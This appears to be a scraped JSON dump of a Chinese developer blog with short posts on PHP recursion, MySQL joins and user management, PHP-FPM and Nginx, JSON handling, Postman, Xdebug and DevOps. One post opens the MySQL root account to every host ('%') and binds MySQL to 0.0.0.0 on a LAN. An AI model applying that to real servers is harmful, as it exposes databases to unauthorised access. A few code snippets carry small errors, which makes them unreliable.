&#x3D;&gt; [] ], 1 &#x3D;&gt; [ &quot;user_id&quot; &#x3D;&gt; &quot;go&quot;, &quot;sup_id&quot; &#x3D;&gt; [ 0 &#x3D;&gt; [ &quot;user_id&quot; &#x3D;&gt; &quot;ruby&quot;, &quot;sub_id&quot; &#x3D;&gt; [] ] ] ], ] ]]; 这个问题的难点在于： 我并不知道有多少个下级 索引是未知的。 对于这个问题，首先第一个想到是使用递归算法来解决。 使用递归算法是没错，不过思路还是有些问题，我试图通过正向查找，然后将数据 push 至结果集。所以这里存在一个问题：我需要知道数组具体的索引是多少。 在第一个思路无解之后，果断放弃了。要解决这个问题，我得正向查找，逆向存值。 也就是把递归返回的结果压入到当前用户的数组中，然后返回当前用户，从最后一个用户往前处理。 最后实现的代码如下： 12345678910111213function get_user_tree($user_id)&#123; $result &#x3D; []; &#x2F;&#x2F; todo（数据查询） &#x2F;&#x2F; 遍历数据 foreach ($data as $item)&#123; $user &#x3D; get_user_tree($item[&#39;user_id&#39;]); $item[&#39;sub_id&#39;] &#x3D; $user; array_push($result, $item); &#125; return $result;&#125; 不得不说递归算法真的非常优雅，仅仅不到十来行代码就把这个复杂的问题给解决了。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"算法","slug":"算法","permalink":"https://www.0x2beace.com/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"Mysql 多表联查","slug":"mysql-multi-table-joint-check","date":"2020-09-24T10:56:22.000Z","updated":"2020-09-24T10:57:00.944Z","comments":true,"path":"mysql-multi-table-joint-check/","link":"","permalink":"https://www.0x2beace.com/mysql-multi-table-joint-check/","excerpt":"Mysql 的两张表联表查询可能大家都知道怎么查，但如果是三张表或者是更多张表呢？","text":"Mysql 的两张表联表查询可能大家都知道怎么查，但如果是三张表或者是更多张表呢？ 其实不管是两张表还是三张表还是N 张表都是一样的。 多表联查1234567891011# 语法一：select t1.*, t2.*, t3.* from table1 t1, table2 t2, table3 t3where t1.id &#x3D; t2.id and t1.id &#x3D; t3.id;# 语法二：select t1.*, t2.*, t3.* from table t1 inner join table2 t2 on t1.id &#x3D; t2.id inner join table3 t3 on t1.id &#x3D; t3.id; 有几点需要注意： 上面的id 并不一定非要使用id，可以是任何有关联性的其他字段 如果表名是关键字，那么需要查询时在这个关键字上加反引号，如：`order` inner join 可以根据实际情况可以换成left join、right join","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"PHP-FPM 与 Nginx 是什么关系？","slug":"what-is-the-relationship-between-php-fpm-and-nginx","date":"2020-09-23T14:35:17.000Z","updated":"2020-09-23T14:41:58.011Z","comments":true,"path":"what-is-the-relationship-between-php-fpm-and-nginx/","link":"","permalink":"https://www.0x2beace.com/what-is-the-relationship-between-php-fpm-and-nginx/","excerpt":"最近部署了几次项目，经常遇到这样一个错误：Nginx 502 bad gateway，查看 Nginx 错误日志之后，发现这样一段话：Primary script unknown，找了好久的答案，总结出以下几个原因：","text":"最近部署了几次项目，经常遇到这样一个错误：Nginx 502 bad gateway，查看 Nginx 错误日志之后，发现这样一段话：Primary script unknown，找了好久的答案，总结出以下几个原因： 未启动 Nginx 未启动 php-fpm Nginx 配置异常 文件夹权限不足 其中未启动 php-fpm 是出现最多的错误，再聊 php-fpm 之前，我们先来学习几个 相关概念。 什么是 cgiCgi 是一个协议，它约定了 web server 和应用程序（如：PHP、Python等）之间的信息交换的标准格式。 静态文件当一个客户端试图访问index.html这个文件时，那么 web server 就回去文件系统中找到这个文件，最后将结果返回给客户端。 非静态文件当一个客户端试图访问index.php这个文件时，web server 收到请求之后，根据配置文件知道了自己处理不了，接着转发给第三方的应用程序（PHP解析器、Python解析器等），web server 知道该传哪些数据吗？它不知道，所以 Cgi 就是约定要传哪些数据，以什么样的格式传递给第三方的应用程序的协议。 应用程序独立处理完该脚本，然后再将结果返回给产生响应的 web server，最后转发响应至客户端。 当 web server 收到 index.php 这个请求之后，会启动对应的 cgi 程序（PHP解析器，Python解析器），接下来解析器会解析 php.ini 配置文件，初始化执行环境，然后处理请求，再以 cgi 规定的格式返回处理后的结果，退出进程。web server 将转发响应至客户端。 这种协议看上去简单有效，但它也存在一些明显不足： 每一个请求产生唯一一个进程，从一个请求到另一个请求，内容和其他的信息全部丢失。 开启一个进程会消耗系统的资源，大而重的并发请求（每产生一个进程）数量很快会使服务器一团糟。 什么是 fastcgi知道了 cgi 是协议之后，那 fastcgi 又是什么呢？ 知道了 cgi 服务器性能低下的原因是因为每产生一个请求，都会做同样的事情：解析器解析配置文件，初始化执行环境，启动一个新的进程。 fastcgi 则是在 cgi 的基础上做了重大的改进，从而达到相同的目的，原理如下： fgstcgi 使用了能够处理多个请求的持续进程，而不是针对每个请求都产生新的进程。 fastcgi 是一个基于套接字的协议，因此它能够适用于任务平台（web server）及任何编程语言。 fastcgi 的性能之所以高于 cgi，是因为 fastcgi 可以对进程进行管理，而这是 cgi 所做不到的，但它的本质仍然是 协议。 什么是 php-fpm默认情况下，PHP 是支持 cgi 和 fastcgi 协议的。 PHP 二进制命令能够处理脚本并且能够通过套接字与Nginx 交互，但是这种方式并不是效率最高的，php-fpm 便是在这样的背景下诞生的。 PHP-FPM （PHP FastCgi 进程管理，PHP Fastcgi Process Manager） php-fpm 将 fastcgi 带到了一个全新的水平。 php-fpm 和 nginx 有什么联系在理解了 cgi、fastcgi、php-fpm 是什么之后，就不难理解 php-fpm 和nginx是什么关系了。 因为 php-fpm 是 php fastcgi 的进程管理器，所以 php-fpm 就是 nginx 与 php 交互时，协助 php 将性能发挥最大的一个程序。 难怪每次 php-fpm 这个进程死掉时，nginx 的状态就变成了 502 。 参考链接 搞不清 Fastcgi 和 cgi 关系","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"https://www.0x2beace.com/tags/PHP-FPM/"}]},{"title":"如何将 JSON 对象转换成 PHP 数组","slug":"how-to-convert-a-json-object-into-a-php-array","date":"2020-09-22T14:58:35.000Z","updated":"2020-09-22T15:00:32.495Z","comments":true,"path":"how-to-convert-a-json-object-into-a-php-array/","link":"","permalink":"https://www.0x2beace.com/how-to-convert-a-json-object-into-a-php-array/","excerpt":"在介绍如何将JSON 字符串转传为PHP 数组之前，先来复习一下什么是JSON。","text":"在介绍如何将JSON 字符串转传为PHP 数组之前，先来复习一下什么是JSON。 JSON通俗一点讲JSON 就是一种数据结构，就是一串字符串，只不过元素会通过特定的符号标注。 {}：大括号表示对象 []：中括号表示数组 &quot;&quot;：双引号内是属性或值 标准的JSON 对象： 123456# 这是一个JSON 对象&#123; &quot;name&quot;: &quot;boo&quot;, &quot;gender&quot;: &quot;men&quot;, &quot;age&quot;: 25&#125; 标准的JSON 数组： 123456789101112131415161718# 这是一个包含两个对象的JSON 数组[ &#123; &quot;name&quot;: &quot;boo&quot;, &quot;gender&quot;: &quot;men&quot;, &quot;age&quot;: 25 &#125;, &#123; &quot;name&quot;: &quot;max&quot;, &quot;gender&quot;: &quot;men&quot;,, &quot;age&quot;: 29 &#125;]# 这是一个包含数组的JSON 对象&#123; &quot;name&quot;:[&quot;Michael&quot;,&quot;Jerry&quot;]&#125; 在熟悉了几种常见的JSON 字符串之后，在来看一下如何解析JSON 字符串。 json_decodeJSON 对象转换为对象 123456789101112131415161718&lt;?php$jsonObj &#x3D; &#39;&#123;&quot;name&quot;: &quot;boo&quot;&#125;&#39;;$obj &#x3D; json_decode($jsonObj);print $obj-&gt;&#123;&quot;name&quot;&#125;; &#x2F;&#x2F;boo$jsonObj2 &#x3D; &#39;[&#123;&quot;name&quot;: &quot;boo&quot;&#125;]&#39;;$obj2 &#x3D; json_decode($jsonObj2);print $obj[0]-&gt;&#123;&quot;name&quot;&#125;; &#x2F;&#x2F;booobject(stdClass)[1] public &#39;name&#39; &#x3D;&gt; string &#39;boo&#39; (length&#x3D;3)array (size&#x3D;1) 0 &#x3D;&gt; object(stdClass)[1] public &#39;name&#39; &#x3D;&gt; string &#39;boo&#39; (length&#x3D;3) JSON 对象转换为数组 12345678&lt;?php$jsonObj &#x3D; &#39;&#123;&quot;name&quot;: &quot;boo&quot;&#125;&#39;;$arr &#x3D; json_decode($jsonObj, true);print $arr[&#39;name&#39;]; &#x2F;&#x2F;booarray (size&#x3D;1) &#39;name&#39; &#x3D;&gt; string &#39;boo&#39; (length&#x3D;3) 需要注意几个容易出错的细节： 123456789101112&lt;?php&#x2F;&#x2F; 大括号外需要使用单引号$bad_json &#x3D; &quot;&#123; &#39;bar&#39;: &#39;baz&#39; &#125;&quot;;json_decode($bad_json); &#x2F;&#x2F; null&#x2F;&#x2F; 属性需要使用双引号引起来$bad_json &#x3D; &#39;&#123; bar: &quot;baz&quot; &#125;&#39;;json_decode($bad_json); &#x2F;&#x2F; null&#x2F;&#x2F; 不允许尾随逗号$bad_json &#x3D; &#39;&#123; bar: &quot;baz&quot;, &#125;&#39;;json_decode($bad_json); &#x2F;&#x2F; null json_encode下面来看看如何返回JSON 格式的数据，通过使用 json_encode这个函数： 123456789101112131415161718192021222324252627$b &#x3D; array();echo &quot;空数组作为数组输出: &quot;, json_encode($b), &quot;\\n&quot;; &#x2F;&#x2F;空数组作为数组输出：[]echo &quot;空数组作为对象输出: &quot;, json_encode($b, JSON_FORCE_OBJECT), &quot;\\n\\n&quot;; &#x2F;&#x2F;空数组作为对象输出：&#123;&#125;$c &#x3D; array(array(1,2,3));echo &quot;多维数组作为数组输出: &quot;, json_encode($c), &quot;\\n&quot;; &#x2F;&#x2F;多维数组作为数组输出：[[1,2,3]]echo &quot;多维数组作为对象输出: &quot;, json_encode($c, JSON_FORCE_OBJECT), &quot;\\n\\n&quot;; &#x2F;&#x2F;多维数组作为对象输出：&#123;&quot;0&quot;:&#123;&quot;0&quot;:1,&quot;1&quot;:2,&quot;2&quot;:3&#125;&#125;$d &#x3D; array(&#39;foo&#39; &#x3D;&gt; &#39;bar&#39;, &#39;baz&#39; &#x3D;&gt; &#39;long&#39;);echo &quot;关联数组只能作为对象输出: &quot;, json_encode($d), &quot;\\n&quot;; &#x2F;&#x2F;关联数组只能作为对象输出：&#123;&quot;foo&quot;:&quot;bar&quot;,&quot;baz&quot;:&quot;long&quot;&#125;echo &quot;关联数组只能作为对象输出: &quot;, json_encode($d, JSON_FORCE_OBJECT), &quot;\\n\\n&quot;; &#x2F;&#x2F;关联数组只能作为对象输出：&#123;&quot;foo&quot;:&quot;bar&quot;,&quot;baz&quot;:&quot;long&quot;&#125;$arr &#x3D; array( &quot;name&quot; &#x3D;&gt; &quot;boo&quot;, &quot;gender&quot; &#x3D;&gt; &quot;men&quot;, &quot;age&quot; &#x3D;&gt; 22);$res &#x3D; json_encode($arr);var_dump($res);echo($res);string &#39;&#123;&quot;name&quot;:&quot;boo&quot;,&quot;gender&quot;:&quot;men&quot;,&quot;age&quot;:22&#125;&#39; (length&#x3D;35)&#123;&quot;name&quot;:&quot;boo&quot;,&quot;gender&quot;:&quot;men&quot;,&quot;age&quot;:22&#125;","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"同一局域网内如何访问项目地址、连接 Mysql","slug":"how-to-access-the-project-address-and-connect-to-mysql-in-the-same-local-area-network","date":"2020-09-21T13:42:44.000Z","updated":"2020-09-23T14:46:39.880Z","comments":true,"path":"how-to-access-the-project-address-and-connect-to-mysql-in-the-same-local-area-network/","link":"","permalink":"https://www.0x2beace.com/how-to-access-the-project-address-and-connect-to-mysql-in-the-same-local-area-network/","excerpt":"如标题所示，在团队项目开发中这是两个很常见的问题，记录一下。","text":"如标题所示，在团队项目开发中这是两个很常见的问题，记录一下。 局域网内共享项目地址有时候会有这样一种需求，自己在本地项目做开发，还没放到服务器上，但是其他人希望能在他的电脑上访问项目。 这个时候就需要这两台电脑在同一个局域网内，也就是连接相同的WiFi 。 然后查看自己的外网IP 地址是多少： 12345# mac&#x2F;linuxifconfig# windowsipconfig 外网IP 地址通常是以192.168.x.xxx打头的IP ，然后把这个IP 配置到对应的域名。 123456789# mac&#x2F;linuxvim &#x2F;usr&#x2F;etc&#x2F;hosts# windowsC:\\Windows\\ System32 \\drivers\\etc\\hosts# hosts 127.0.0.1 example.com192.168.x.xxx example.com 配置完成之后，直接把example.com这个域名丢给对方，对方就在他自己的电脑上可以访问了。 局域网内连接Mysql想要在局域网内，让别人能连接到我的数据库，需要注意以下两点： 对本地Mysql 授权，允许其他用户连接 Mysql 开放外网访问 对于第一点，可以以下命令来完成： 123451. mysql -hlocalhost -uroot -p;2. use mysql;# 修改权限，允许其他人连接：3. update user set host&#x3D;&#39;%&#39; where user&#x3D;&quot;root&quot;;4. flush privileges; 通常完成第一步，就可以连接了，如果连接异常，可以尝试第二步： 12345# 打开Mysql 配置文件vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;my.cnfbind-address &#x3D; 0.0.0.0# 127.0.0.1 替换成 0.0.0.0; 然后重启Mysql 数据库即可。 其他人怎么连接我的数据库？ 把这个丢给他： 123host：你的外网IP 地址user：你的Mysql 用户pwd：你的Mysql 密码","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"局域网","slug":"局域网","permalink":"https://www.0x2beace.com/tags/%E5%B1%80%E5%9F%9F%E7%BD%91/"},{"name":"防火墙","slug":"防火墙","permalink":"https://www.0x2beace.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"}]},{"title":"mysql5.7用户管理：添加用户、授权、撤权、修改密码","slug":"mysql5-7-user-management-add-users-authorize-revoke-rights-modify-passwords","date":"2020-09-20T15:42:13.000Z","updated":"2020-09-20T15:43:47.158Z","comments":true,"path":"mysql5-7-user-management-add-users-authorize-revoke-rights-modify-passwords/","link":"","permalink":"https://www.0x2beace.com/mysql5-7-user-management-add-users-authorize-revoke-rights-modify-passwords/","excerpt":"因为Mysql 5.7 是目前使用最多的数据库，而5.7 在某些地方又和其他版本有所不同，所以记录一下。","text":"因为Mysql 5.7 是目前使用最多的数据库，而5.7 在某些地方又和其他版本有所不同，所以记录一下。 创建用户123# 语法：CREATE USER &#39;username&#39;@&#39;host&#39; IDENTIFIED BY &#39;password&#39;;mysql&gt; CREATE USER &#39;boo&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;122410&#39;; host 参数说明： %：匹配所有主机 localhost：当前主机，localhost 不会被解析成IP地址，而是通过UNIXsocket 连接 127.0.0.1：当前主机，通过TCP/IP 协议连接 ::1：当前主机，兼容支持ipv6 此时还没有授权，只能登陆，无法做其余操作 用户授权1234567891011121314# 创建完成之后授权mysql&gt; grant all privileges ON &#96;dbName&#96;.* TO &#39;username&#39;@&#39;host&#39;;# 创建用户同时授权mysql&gt; grant all privileges on dbName.* to &#39;username&#39;@&#39;host&#39; identified by &#39;password&#39;;# 刷新权限mysql&gt; flush privileges;# 查看用户所有权限mysql&gt; show grants for dev@&#39;%&#39;;# 撤消用户授权，撤消要求各参数与授权时使用的一致，可以先查看授权再撤消mysql&gt; revoke privileges ON dbName.* FROM &#39;username&#39;@&#39;host&#39;; privileges 参数说明： all privileges: 所有权限； select: 查询； insert: 新增记录; update: 更新记录； delete: 删除记录； create: 创建表； drop: 删除表； alter: 修改表结构； index: 索引相关权限； execute: 执行存储过程与call函数 references： 外键相关； create temporary tables：创建临时表； lock tables：锁表； create view：创建视图； show view：查看视图结构； trigger: 触发器； dbName 可以是某个库（database），也可以是具体到某张表（database.table），也可以是所整个数据库（*）。 修改密码1234567891011121314# 修改自己的密码mysql&gt; set password&#x3D;password(&#39;newpassword&#39;);# 修改别人密码——方法1mysql&gt; set password for &#39;username&#39;@&#39;host&#39; &#x3D; password(&#39;newpassword&#39;);# 修改别人密码——方法2: 适用mysql5.7以前的版本，5.7以后的版本中mysql.user表没有了password字段mysql&gt; update mysq.user set password&#x3D;password(&#39;newpassword&#39;) where user&#x3D;&#39;user&#39; and host&#x3D;&#39;host&#39;;# 修改别人密码——方法3：适用mysql5.7mysql&gt; update mysql.user set authentication_string&#x3D;password(&#39;newpassword&#39;) where user&#x3D;&#39;root&#39;;# 修改别人密码——方法4mysql&gt; alter user &#39;test&#39;@&#39;%&#39; identified by &#39;newpassword&#39;; 删除用户1mysql&gt; DROP USER &#39;username&#39;@&#39;host&#39;; 不建议直接通过修改mysql.user表去操作用户。 参考链接 mysql5.7用户管理：添加用户、授权、撤权、修改密码","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Postman 使用技巧整理","slug":"postman-tips","date":"2020-09-19T12:58:16.000Z","updated":"2020-10-30T00:22:26.807Z","comments":true,"path":"postman-tips/","link":"","permalink":"https://www.0x2beace.com/postman-tips/","excerpt":"Postman 作为http 请求工具，无论是开发还是测试所使用的频率还是挺高的，这篇笔记用来整理一下常用的使用技巧。","text":"Postman 作为http 请求工具，无论是开发还是测试所使用的频率还是挺高的，这篇笔记用来整理一下常用的使用技巧。 发送表单提交这里的表单提交就是指传统的表单提交。 核心请求头信息： 12Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;Content-Type: application&#x2F;x-www-form-urlencoded body 的数据格式选择form-data。 发送Ajax 请求核心请求头信息： 123Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*;Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8X-Requested-With: XMLHttpRequest body 的数据格式选择 x-www-form-urlencode，如果选择form-data则接收到的数据格式会是这个样子： 如果以x-www-form-urlencode格式进行提交，那么接收到的数据是这个样子，可以直接通过魔术变量获取使用。 如何把请求参数作为json 格式进行提交？在Body中，选择raw 然后把请求参数以json 的格式填进去。 不过需要注意，以json 格式提交的请求，用常见的魔术变量获取不到，需要使用以下方式： 1json_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)); 提交文件有时候我们希望可以测试文件提交，使用 Postman 当然也可以完成。 请求方式选择POST，Headers 可以不用做选择，Body 选择 form-data，类型由默认的text 改成 file，然后选择需要提交的文件即可。 注意：key 最好也填上 file 这个关键字。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Postman","slug":"Postman","permalink":"https://www.0x2beace.com/tags/Postman/"},{"name":"JSON","slug":"JSON","permalink":"https://www.0x2beace.com/tags/JSON/"}]},{"title":"Mysql 常见异常分析","slug":"mysql-common-exception-analysis","date":"2020-09-17T12:52:29.000Z","updated":"2020-09-17T12:57:42.663Z","comments":true,"path":"mysql-common-exception-analysis/","link":"","permalink":"https://www.0x2beace.com/mysql-common-exception-analysis/","excerpt":"本文用来整理 Mysql 使用过程中遇到的一些问题。","text":"本文用来整理 Mysql 使用过程中遇到的一些问题。 Mysql 无法正常启动异常描述：Mysql Server 无法正常启动，Client 连接Mysql 异常如下： ERROR 2002 (HY000): Can’t connect to local MySQL server through socket ‘/var/run/mysqld/mysqld.sock’ (2) 首先，这个错误意味着 /var/run/mysqld/mysqld.sock 不存在，而该文件之所以不存在，可能是因为没有安装 mysql-server，也可能是因为该文件被移动了。 如果是需要连接本机的Mysql（mysql -hlocalhost -uroot -p），那么需要先安装 mysql server： 1apt-get install mysql-server -y 如果Mysql 服务确实有在本地运行，那么请检查/etc/mysql/mysql.conf.d/mysqld.cnf 配置文件，是否存在以下配置： 1socket &#x3D; &#x2F;var&#x2F;run&#x2F;mysqld&#x2F;mysqld.sock 如果只是需要连接其他主机，那么在本机上不安装 Mysql Server 也可以，但需要保证“其他主机”的Mysql 已经正常启动。 1mysql -h&lt;hostname&gt; -uroot -p 总结：最有可能的情况是需要连接的Mysql 服务根本没有启动，要么没有在与从终端运行MySQL客户端的主机相同的主机上运行，小概率是因为配置文件错误导致。 Mysql 用户验证失败异常描述：Mysql 创建完该用户之后，赋予权限并设置密码，但是总是会提示如下异常： ERROR 1045 (28000): Access denied for user ‘zabbix’@’172.17.0.1’ (using password: YES) 出现该异常信息可能有以下几种情况： 用户名密码错误 该用户权限不足 Mysql 断开连接异常描述：Mysql 偶尔会自己断开连接，然后必须重启Mysql 服务才能正常运行。 ERROR 2013 (HY000): Lost connection to MySQL server at ‘reading initial communication packet’, system error: 102 目前并没有找到合适的解决方案，不过能大致确定以下几个方向： 反向DNS 解析，避免使用localhost 允许使用所有连接？ localhost 对应socket？127.0.0.1 对应 TCP/IP？ 参考链接 错误2002(HY000)：无法通过Socket‘/var/run/mysqld/mysqld.sock’连接到本地MySQL服务器(2) ERROR 2013 (HY000): Lost connection to MySQL server at ‘reading authorization packet’, system error: 0","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mysql 数据库设计规范与原则","slug":"mysql-database-design-rules-and-principles","date":"2020-09-16T12:48:21.000Z","updated":"2020-09-16T12:51:01.020Z","comments":true,"path":"mysql-database-design-rules-and-principles/","link":"","permalink":"https://www.0x2beace.com/mysql-database-design-rules-and-principles/","excerpt":"最近需要根据业务需求重新设计一套完整的数据库，记录一下规范的数据库设计原则。","text":"最近需要根据业务需求重新设计一套完整的数据库，记录一下规范的数据库设计原则。 1、数据库命名规范 命名简洁明确，可以采用字母 + 数字进行组合，多个单词可以使用下划线 _ 进行分割。 一般来说，数据表命名用单数，字段命名也用单数 数据库里面的密码一定要加密，不能保存明文 Mysql 引擎类型统一使用 InnoDB，字符编码统一使用 UTF-8 2、数据库表名命名规范 命名简洁明确，可以采用字母 + 数字进行组合，多个单词可以使用下划线 _ 进行分割。 可以合理增加表前缀，有效区分不同类型的数据表 3、数据库表字段名命名规范 命名简洁明确，多个单词使用下划线_进行分割（统一使用小写） 避免使用自定义缩写，如：date =&gt; dt 表与表之间的相关联字段名称要求尽可能的相同 每个字段尽量备注其含义 4、数据库表字段类型规范 最好给每个字段一个默认值，避免使用 NULL。字符型默认值为一个空字符值串，数值型的默认值为数值0，逻辑型的默认值为数值0 用尽量少的存储空间来存储一个字段的数据 能用 tinyint 就不用 int，能用 int 就不要用 varchar，能用 varchar(16)就不要用 varchar(225) boolean 类型的命名统一使用is_xxx格式 5、数据库表索引规范 为每个表创建一个主键索引; 为每个表创建合理的普通索引; 一些注意事项 避免使用NULL字段(NULL字段很难查询优化、NULL字段的索引需要额外空间、NULL字段的复合索引无效) 避免使用 count(*) 避免使用 select * 参考链接 MYSQL数据库设计规范与原则 数据库设计原则 数据库表名字段命名规范","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Windows、Mac 下使用 PHPStorm 配置 Xdebug，实现断点调试","slug":"use-phpstorm-to-configure-xdebug-under-windows-and-mac","date":"2020-09-15T13:15:36.000Z","updated":"2020-09-15T13:21:21.882Z","comments":true,"path":"use-phpstorm-to-configure-xdebug-under-windows-and-mac/","link":"","permalink":"https://www.0x2beace.com/use-phpstorm-to-configure-xdebug-under-windows-and-mac/","excerpt":"搭建过很多次开发环境了，但每次在调试这一块还是会多少耗费一点时间。所以便有了这篇关于PHPSTORM调试的笔记。","text":"搭建过很多次开发环境了，但每次在调试这一块还是会多少耗费一点时间。所以便有了这篇关于PHPSTORM调试的笔记。 在进行调试之前，首先要做的是下载并安装Xdebug，然后才能做相应的配置。 下载Xdebug（Windows） xdebug官网 如何选择符合自己PHP的版本的Xdebug，可以通过下面这种方法来判断。 使用Xdubug官方提供的一个检测工具 在命令行中输入： 12345678# Mac$ php -i | pbcopy# Linux$ php -i | xsel # Windows$ php -i | clip 将输出的phpinfo信息填入，然后就会自动检测该版本的PHP 所对应的Xdebug，如下图（这里以Windows 为例）： 点击下载相应的文件。 安装并配置Xdebug 将下载好的文件放进指定目录 ..\\php\\ext\\ 配置php.ini文件，这里需要注意的是：要找到正确的php.ini文件。如果你不确定是哪一个，可以参考下面这个方法： 打印出phpinfo()，找到字段Loaded Configuration File根据后面的路径去找就没错了。 打开找到的php.ini配置文件，在最后面加上以下代码： 12345678# Windows[XDebug]zend_extension &#x3D; &quot;C:\\xampp\\php\\ext\\php_xdebug-2.6.1-7.2-vc15.dll&quot; #这个地址指向 xdebug所在的文件路径xdebug.profiler_enable &#x3D; 1xdebug.remote_enable &#x3D; 1xdebug.remote_port&#x3D;9001xdebug.idekey&#x3D;PHPSTROMxdebug.remote_host &#x3D; localhost 其中： xdebug.remote.host如果是本地调试，填localhost就好。 xdebug.remote_port为调试所监听的端口，通常默认使用 9001 ，需要和PHPStorm 中的 Debug port 相同。 下载并安装Xdebug（Mac）Mac 下安装Xdebug，有两种方式： 使用pecl命令 通过源码编译 使用 pecl Pecl 是 PHP 的包管理器。 这里以PHP5.6为例，需要安装最新2.5.x版本的Xdebug，因为这是PHP5.6提供支持的最后一个版本。 1$ pecl install xdebug-2.5.5 源码编译源码获取的方式和上面Windows 的方式是一样的，将输出的phpinfo粘贴至输入框，然后下载对应版本的Xdebug。 123456$ tar -xvzf xdebug-2.9.4.tgz$ cd xdebug-2.9.4.tgz$ phpize$ .&#x2F;configure$ make$ cp modules&#x2F;xdebug.so &#x2F;usr&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;xdebug 启用Xdebug无论是通过哪种方式安装，在正式使用之前，都需要手动启用该模块。 找到对应版本的 php.ini 文件并编辑，在配置文件中的最后部分加上以下内容： 1234567[XDebug]zend_extension&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;xdebug&#x2F;xdebug.so&quot;xdebug.profiler_enable &#x3D; 1xdebug.remote_enable &#x3D; 1xdebug.remote_port&#x3D;9001xdebug.idekey&#x3D;PHPSTORMxdebug.remote_host &#x3D; localhost 重启PHP即可。 如何检查Xdebug 是否启用？ 12$ php -m | grep xdebugxdebug 在PHPStorm中配置XdebugMac File-&gt;Setting-&gt;PHP-&gt;Debug，确保PHPStorm 已经找到了Xdebug。 在刚才的配置没错的前提下，这里是可以看到已经成功安装了Xdebug的。 如果显示没有安装，请检查上面两步操作有无问题。 File-&gt;Setting-&gt;PHP-&gt;Debug Debug port 与php.ini配置文件中的xdebug.remote_port的对应参数保持一致。 File-&gt;Setting-&gt;PHP-&gt;Server，这三个参数的值和php.ini中的保持一致。 配置域名 这里根据实际情况配置，我本地使用80 端口作为项目访问端口，所以这里填的是80。 配置调试参数 Run-&gt;Web Server Debug Validation，检查是否配置成功。 确保项目文件路径和本地域名能正常访问，如果一切正常则能看到输出。 WindowsWindows 下的PHPStorm 配置和Mac 几乎差不多，保证一下几点是正常的基本上没啥问题。 确保PHPStorm 启用了对应版本的 Xdebug。 PHPStorm 的调试信息与php.ini文件中保持一致。 项目文件路径和本地域名能正常访问。 Xdebug 调试端口并非一定要用9001，只要保持php.ini与PHPStorm 的保持一致就好了。 在PHPStorm中使用Xdebug有两种方式使用Xdebug： 直接在编辑器中开始调试。 通过在请求地址中附加xdebug 的请求参数来调试，这招通常用来处理一些前后端分离的联动调试。 参考链接 PhpStrom Xdebug 配置与使用 如何在Mac 上为不同版本的PHP 开启Xdebug 配置Xdebug-官方教程 Xdebug 官网 Xdebug 检测工具","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Xdebug","slug":"Xdebug","permalink":"https://www.0x2beace.com/tags/Xdebug/"}]},{"title":"什么是DevOps、CI、CD、K8S","slug":"what-is-devops-ci-cd-k8s","date":"2020-09-12T14:40:00.000Z","updated":"2020-09-14T01:44:10.169Z","comments":true,"path":"what-is-devops-ci-cd-k8s/","link":"","permalink":"https://www.0x2beace.com/what-is-devops-ci-cd-k8s/","excerpt":"之所以要写这片笔记，是因为前段时间在使用 gitlab 提交代码时，遇到了点问题。 gitlab 提示我 commit 失败。跟进了一下，并没有找到答案。","text":"之所以要写这片笔记，是因为前段时间在使用 gitlab 提交代码时，遇到了点问题。 gitlab 提示我 commit 失败。跟进了一下，并没有找到答案。 只是了解到一个叫做 CI/CD的东西。后来又延伸扩展到DevOps、K8S 这些新概念。 什么是 DevOps？如题，什么是 DevOps ？根据字面意思理解就是：Dev + Ops，开发（Development）和运营（Operations）这两个领域的合并。 就我个人的理解，它是一个概念、一种思维，是一种通力合作，共同解决问题的方式。 这里我就不追根溯源去解释为什么要合并开发和运营了，因为历史原因，总是存在着这样的问题。具体看参考链接一。 DevOps 